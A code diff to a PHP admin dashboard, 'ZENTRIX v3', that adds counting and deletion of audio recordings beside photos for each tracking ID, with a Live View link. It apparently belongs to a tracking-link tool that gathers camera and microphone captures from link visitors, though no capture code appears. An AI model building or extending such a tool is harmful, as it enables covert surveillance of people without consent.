@@ -1,7 +1,7 @@
 <?php
 /**
  * ZENTRIX v3 – Admin Dashboard
- * With photo count support
+ * With Photo + Audio count support
  */
 
 session_start();
@@ -10,16 +10,26 @@ $config = require __DIR__ . '/config.php';
 // Handle delete
 if (isset($_GET['delete']) && !empty($_SESSION['zentrix_admin'])) {
     $delId = preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['delete']);
+    
+    // Delete log file
     $file = __DIR__ . '/logs/' . $delId . '.json';
     if (file_exists($file)) {
         unlink($file);
     }
 
-    // Also delete related photos
+    // Delete related photos
     $photoDir = __DIR__ . '/logs/photos';
     if (is_dir($photoDir)) {
         foreach (glob($photoDir . '/' . $delId . '_*.jpg') as $photo) {
             @unlink($photo);
+        }
+    }
+
+    // Delete related audio
+    $audioDir = __DIR__ . '/logs/audio';
+    if (is_dir($audioDir)) {
+        foreach (glob($audioDir . '/' . $delId . '_*.{webm,ogg,mp3,wav}', GLOB_BRACE) as $audio) {
+            @unlink($audio);
         }
     }
 
@@ -283,6 +293,7 @@ $latestHits = array_slice($latestHits, 0, 8);
                             <th>Tracking ID</th>
                             <th>Hits</th>
                             <th>Photos</th>
+                            <th>Audio</th>
                             <th>Last Activity</th>
                             <th>Actions</th>
                         </tr>
@@ -300,11 +311,19 @@ $latestHits = array_slice($latestHits, 0, 8);
                             if (is_dir($photoDir)) {
                                 $photoCount = count(glob($photoDir . '/' . $id . '_*.jpg'));
                             }
+
+                            // Count audio
+                            $audioCount = 0;
+                            $audioDir = __DIR__ . '/logs/audio';
+                            if (is_dir($audioDir)) {
+                                $audioCount = count(glob($audioDir . '/' . $id . '_*.{webm,ogg,mp3,wav}', GLOB_BRACE));
+                            }
                         ?>
                         <tr>
                             <td><code style="color: var(--success);"><?= htmlspecialchars($id) ?></code></td>
                             <td><?= $hits ?></td>
                             <td><?= $photoCount ?></td>
+                            <td><?= $audioCount ?></td>
                             <td><?= htmlspecialchars($lastTime) ?></td>
                             <td class="actions">
                                 <a href="liveview.php?id=<?= urlencode($id) ?>" class="btn-secondary" style="padding: 4px 10px;">Live View</a>
@@ -320,7 +339,7 @@ $latestHits = array_slice($latestHits, 0, 8);
 
     <script>
         function deleteLog(id) {
-            if (!confirm('Delete tracking ID "' + id + '" and all its logs + photos?\nThis cannot be undone.')) return;
+            if (!confirm('Delete tracking ID "' + id + '" and all its logs + photos + audio?\nThis cannot be undone.')) return;
 
             fetch('admin.php?delete=' + encodeURIComponent(id), {
                 method: 'POST'
